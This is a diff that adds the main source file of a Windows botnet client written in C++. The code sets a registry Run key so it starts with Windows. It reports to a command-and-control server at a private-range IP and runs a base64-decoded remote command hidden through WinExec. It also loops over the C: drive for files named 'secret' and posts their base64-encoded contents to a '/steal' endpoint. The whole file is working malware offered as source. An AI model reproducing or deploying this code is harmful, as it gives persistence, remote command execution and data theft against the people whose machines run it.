@@ -1,0 +1,112 @@
+// BotnetWin32.cpp : Defines the entry point for the application.
+//
+
+#include "stdafx.h"
+#include "BotnetWin32.h"
+#include "Utils.h"
+#include "Connection.h"
+#include "base64.h"
+#include "DirectoryTraversal.h"
+
+
+string ip = "192.168.0.45";
+//string ip = "192.168.0.10";
+string prefix = "192.168.0.";
+TCHAR buf[255] = { 0 };
+Utils utils;
+Connection conn(ip);
+base64 base;
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+                     _In_opt_ HINSTANCE hPrevInstance,
+                     _In_ LPWSTR    lpCmdLine,
+                     _In_ int       nCmdShow)
+{
+	//utils.HideConsole();
+	//utils.DenyAccess();
+
+	//Accessing the registry value for autoloading
+
+	
+	HKEY hKey;
+	
+	if(RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	{
+		//Checking if the registry value exists
+
+		DWORD dwType = REG_SZ;
+		DWORD dwBufSize = sizeof(buf);
+		if(RegQueryValueEx(hKey, L"foobar", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
+		//if (RegQueryValueEx(hKey, L"Spyke", 0, &dwType, (LPBYTE)buf, &dwBufSize) != ERROR_SUCCESS)
+			// Creating the registry value for autoloading
+			utils.Autoload();
+	}
+	else
+		utils.Autoload();
+
+	// Accessing the registry value for ID
+
+	if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
+	{
+		//Checking if the registry value exists
+
+		DWORD dwType = REG_SZ;
+		DWORD dwBufSize = sizeof(buf);
+		if (RegQueryValueExW(hKey, L"ID", 0, NULL, (LPBYTE)buf, &dwBufSize) == ERROR_SUCCESS)
+		{
+			// Set the class attribute equal to the registry value
+			utils.SetID(buf);
+		}
+		else
+		{
+			// Generate a new ID and create a new registry value
+			utils.GenerateID();
+		}
+	}
+	else
+	{
+		utils.GenerateID();
+	}
+	
+	// sending an initial message to C&C
+	conn.HTTPPost(utils.GetID(), "I am alive!");
+	
+	// getting a command from C&C and starting
+	conn.HTTPGet("/cmd");
+	vector<BYTE> cmvec = base.base64_decode(conn.GetBuffer());
+	string command(cmvec.begin(), cmvec.end());
+	WinExec(command.c_str(), SW_HIDE);
+	
+	vector<pair<string, bool>> files;
+	while (true)
+	{
+		FindByFilename("secret", "C:\\", files);
+		for (int i = 0; i < files.size(); ++i)
+		{
+			if (files[i].second)
+				continue;
+			string filename = files[i].first;
+			stringstream ss;
+			std::ifstream iff(filename, ios::binary);
+			ss << iff.rdbuf();
+			string contents = ss.str();
+
+			vector<BYTE> byte_array(contents.begin(), contents.end());
+			string based_string = base.base64_encode(&byte_array[0], byte_array.size());
+			long long pos = filename.length() - 1;
+			while (filename[pos] != '/')
+			{
+				--pos;
+			}
+			string short_filename = filename.substr(pos + 1);
+			for (int i = 0; i < 100; ++i)
+			{
+				ip = prefix + to_string(i);
+				conn.HTTPPost(utils.GetID(), short_filename + ":" + based_string, "/steal");
+			}
+			files[i].second = true;
+		}
+		Sleep(30000);
+	}
+	return 0;
+}
